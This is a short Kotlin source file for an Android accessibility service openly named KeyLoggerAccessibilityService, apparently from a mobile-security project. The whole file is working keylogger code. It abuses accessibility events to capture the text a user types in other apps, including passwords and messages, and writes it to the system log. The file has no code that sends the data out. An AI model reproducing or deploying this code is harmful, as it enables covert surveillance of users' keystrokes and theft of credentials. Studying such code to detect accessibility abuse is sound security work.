package com.mycompany.mobilesecv2

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.util.Log

class KeyLoggerAccessibilityService : AccessibilityService() {
    override fun onServiceConnected() {
        Log.d("KeyLogger", "Service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event?.let {
            if (it.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                val text = it.text?.joinToString(" ") ?: ""
                Log.d("KeyLogger", "Input captured: $text")
            }
        }
    }

    override fun onInterrupt() {}
}